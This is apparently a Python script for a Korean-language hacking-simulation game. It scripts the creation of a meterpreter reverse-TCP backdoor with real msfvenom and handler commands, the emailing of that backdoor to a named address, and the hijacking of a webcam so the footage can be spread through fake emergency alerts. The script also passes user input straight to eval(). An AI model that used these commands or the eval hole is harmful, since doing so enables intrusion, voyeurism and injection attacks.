from random import *
import os

def semStep(step: int):
	semStep = [0,2,2,1,2,3,0]
	return semStep[step]

def ipconfig(src: str):
	return('''Windows IP 구성

이더넷 어댑터 이더넷:

   연결별 DNS 접미사. . . . : 
   링크-로컬 IPv6 주소 . . . . : fe80::99ff:aae8:27e0:d6bd%16
   IPv4 주소 . . . . . . . . . : 144.13.135.13
   서브넷 마스크 . . . . . . . : 255.255.255.0
   기본 게이트웨이 . . . . . . : 144.13.135.255

무선 LAN 어댑터 Wi-Fi:

   미디어 상태 . . . . . . . . : 미디어 연결 끊김
   연결별 DNS 접미사. . . . : \n''')

def man(src: str):
	src = src[0]
	if src == 'msfvenom':
		return '''back          Move back from the current context
banner        Display an awesome metasploit banner
cd            Change the current working directory
color         Toggle color
connect       Communicate with a host
edit          Edit the current module with $VISUAL or $EDITOR
exit          Exit the console
get           Gets the value of a context-specific variable
getg          Gets the value of a global variable
go_pro        Launch Metasploit web GUI
grep          Grep the output of another command
help          Help menu
info          Displays information about one or more module
irb           Drop into irb scripting mode
jobs          Displays and manages jobs
kill          Kill a job
load          Load a framework plugin
loadpath      Searches for and loads modules from a path
makerc        Save commands entered since start to a file
popm          Pops the latest module off the stack and makes it active
previous      Sets the previously loaded module as the current module
pushm         Pushes the active or list of modules onto the module stack
quit          Exit the console
reload_all    Reloads all modules from all defined module paths
rename_job    Rename a job
resource      Run the commands stored in a file
route         Route traffic through a session
save          Saves the active datastores
search        Searches module names and descriptions
sessions      Dump session listings and display information about sessions
set           Sets a context-specific variable to a value
setg          Sets a global variable to a value
show          Displays modules of a given type, or all modules
sleep         Do nothing for the specified number of seconds
spool         Write console output into a file as well the screen
threads       View and manipulate background threads
unload        Unload a framework plugin
unset         Unsets one or more context-specific variables
unsetg        Unsets one or more global variables
use           Selects a module by name
version       Show the framework and console library version numbers
'''
	elif src=='msfconsole':
		return '''Usage: msfconsole [options]
Common options
	-E, --environment ENVIRONMENT	The Rails environment. Will use RAIL_ENV environment variavle if that is set. Defaul neither option not RAIL_ENV environment variable is set.

Database options
	-M, --migration-path DIRECTORY	Specify a directory containing additional DB migrations
	-n,  --no-database			Disable database support
	-y,  --no yaml PATH		Specify a YAML file containing database settings

Framework options
	-c FILE				Load the specified configuration file
	-v,  --version			Show version

Module option
	     --defer-module-loads		Defer module loading unless explicitly asked.
	-m, --module-path DIRECTORY	An additional module path

Console options:
	-a,  --ask				Ask before exiting Metasploit or accept 'exit -y'
	-d,  --defanged			Execute the console as defanged
	-L,  --real-readline			Use the system Readling library instead of RbReadline
	-o,  --output FILE			Output to the specified file
	-p,  --plugin PLUGIN		Load a plugin on startup
	-q,  --quiet			Do not print the banner on startup
	-r,  --resource FILE			Execute the specified resource file (- for stdin)
	-x,  --execute-command COMMAND	Execute the specified string as console commands (use ; for multiples)
	-h, --help				Show this message
	'''
	elif src=='get-cam':
		return '''Usage of Get-Cam
get-cam --ip asdf --port asdf --sys windows10/64 --hw samsung'''
	else:
		return 'NO'

def msfvenom(src: str):
	if src=='-p windows/meterpreter/reverse_tcp LHOST=144.13.135.13 LPORT=2031 -f exe > back.exe':
		f = open('hack.exe', 'w')
		f.write('KeKeKe')
		f.close()
		return '''No platform was selected, choosing Msf: : m=Modoul: : Platform: :Windows from the paload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 333bytes
Final size of exe file: 73802 bytes'''

def msf(src: str):
	return '''payload => windows/meterpreter/reverse_tcp(노란색)
lhost => 144.168.0.22
lport => 2031
ExitONsession => false'''

def result(cmd: str):
	flag = cmd.split(' ')
	app = flag[0]
	del(flag[0])
	if not app in globals().keys():
		result = 'Unknown Command. Check if installed or spelling.\n<ERROR Code:0xE3A4 Reg:'+app+'></ERROR>\n'
	else:
		result = eval(app+f'({flag})')
	return(result)

def tip(step: int):
	tip = ['You FOUND Easter EGG!!!\n\nCONGRATUATIONS\n\nhttps://m03.pw/hacknet_ItsEasterEgg.html',
	'우리가 울랄라 대장의 이메일 주소를 알아냈어.\n이 주소로 백도어가 심어진 PPT파일을 보내야 해.\n먼저 PPT파일에 백도어를 심어보자.\n백도어를 만들때에는 Metasploit를 사용합니다.\n먼저, 자신의 IP를 알아내자! 어떻게 해야 할까??\n',
	'백도어를 만들어 보자! METASPLOIT이라는 프로그램은, 백도어가 심어진 파일을 만들 수 있게 해줘. METASPLOIT은 msfvenom라는 명령어로 확인할 수 있습니다! 이제 Metasploit을 사용하는 법을 알아야 겠지? 어떤 명령어의 도움말을 알기 위해서는 "man <CMD>"라는 명령어를 사용해. 기억해 두자! 이제 사용법을 알아볼까?',
	'이제 백도어를 만들어야 겠지? 만들어 보자! 우리가 쓸 페이로드는 windows/meterpreter/reverse_tcp야!',
	'울랄라 대장의 이메일은\ngshs_decode@gmail.com\n이야. 여기에 만든 파일을 보내자.\n답장이 왔다면 백도어가 작동하는지 확인해보자! 백도어는 msfconsole이라는 명령어로 실행할 수 있어! 도움말을 보자!',
	'좋아 이제 대충은 알겠지? 핸들러를 실행시켜보자!',
	'이제 그 동영상을 녹화해서 유포하자!\n어디에다가 유포하할까??\n\n그래! 근처의 모든 사람들에게 문자를 보내자! 어떻게?? [긴급재난문자]',
	'''It's Step 6!''',
	'''It's Step 7!'''
	]

	return(tip[step])

def newTip(step: int, count: int):
	print(step, count)
	if count == semStep(step):
		return '다음 단계로 넘어가자'
	nTip = ['',
	['좋아! IP주소를 알아냈지? ip 주소를 입력창에 적어보자. 그리고 그 컴퓨터의 포트번호는 2031이야.','좋아 이 IP주소랑 포트번호를 기억하고 있자! 백도어는 METASPLOIT이라는 프로그램으로 실행할 수 있어! Next_Step'],
	['도움말을 읽어보고 무엇을 해야 할지 생각해 보자! 근데 페이로드는 뭐고, msfvenom은 뭐지..? "openvideo"로 영상을 보자!','sys:run explorer http://sv.m03.pw/video/01.mp4'],
	['이제 바탕화면에 EXE파일이 생성되었겠지?? 이걸 보내보자!'],
	['이제 msf콘솔을 사용할 수 있어!\n원격제어를 하기위한 방법을 알기전에 영상을 다시 보자. 어떤 명령어를 입력해야 하지?\n','sys:run explorer http://sv.m03.pw/video/02.mp4'],
	['좋아! 이제 그 컴퓨터는 너의 것이야! 이제 우리는 카메라를 켜야겠지? 카메라에서 영상을 가져오는 명령어는 getcam이야. 어떻게 사용하는 걸까?','\n해보자!\n','sys:run explorer http://sv.m03.pw/video/04.mp4']
	]
	newTip = nTip[step][count]
	if 'sys:run ' in newTip:
		os.system(newTip.replace('sys:run ',''))
	return newTip

def isCorrect(cmd: str, step: int, count: int):
	print(cmd, step, count)
	lis = ['',
	['ipconfig','144.13.135.13'],
	['man msfvenom','openvideo'],
	['msfvenom -p windows/meterpreter/reverse_tcp LHOST=144.13.135.13 LPORT=2031 -f exe > back.exe'],
	['man msfconsole', 'openvideo'],
	['msf use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LHOST=144.168.0.22 set LPORT=2031 set ExitONsession false','man getcam','get-cam --ip asdf --port asdf --sys windows10/64 --hw samsung']
	]
	if lis[step][count] == cmd:
		print(True)
		return True